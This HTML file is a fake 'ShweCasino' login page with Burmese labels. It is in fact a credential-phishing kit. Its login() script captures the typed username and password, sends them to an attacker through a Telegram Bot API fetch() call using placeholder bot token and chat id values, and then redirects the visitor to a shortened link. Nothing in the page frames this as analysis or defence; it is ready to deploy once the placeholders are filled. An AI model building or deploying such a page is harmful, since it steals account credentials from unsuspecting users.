<!DOCTYPE html>
<html lang="my">

<head>
<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>ShweCasino Login</title>

<style>

*{
box-sizing:border-box;
}

body{
margin:0;
font-family:Arial;
background:#8b0000;
color:white;
min-height:100vh;
}

/* banner */

.banner img{
width:100%;
height:220px;
object-fit:cover;
display:block;
}

/* login box */

.login-box{
background:#6b0000;
margin:20px;
padding:20px;
border-radius:10px;
max-width:400px;
margin-left:auto;
margin-right:auto;
}

/* input */

input{
width:100%;
padding:12px;
margin:8px 0;
border:none;
border-radius:6px;
font-size:16px;
}

/* button */

button{
width:100%;
padding:12px;
background:gold;
border:none;
border-radius:6px;
font-size:16px;
font-weight:bold;
cursor:pointer;
}

</style>

</head>

<body>

<div class="banner">
<img src="https://i.imgur.com/8Km9tLL.jpg">
</div>

<div class="login-box">

<h2>အကောင့်ထဲဝင်ရန်</h2>

<input id="user" placeholder="အကောင့်အမည်">

<input type="password" id="pass" placeholder="စကားဝှက်">

<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>

</div>

<script>

const token = "PUT_BOT_TOKEN";
const chat_id = "PUT_CHAT_ID";

function login(){

let user=document.getElementById("user").value;
let pass=document.getElementById("pass").value;

let text =
"LOGIN INFO\n"+
"Username: "+user+"\n"+
"Password: "+pass;

fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);

window.location.href="https://cutt.ly/otrecCFE";

}

</script>

</body>
</html>
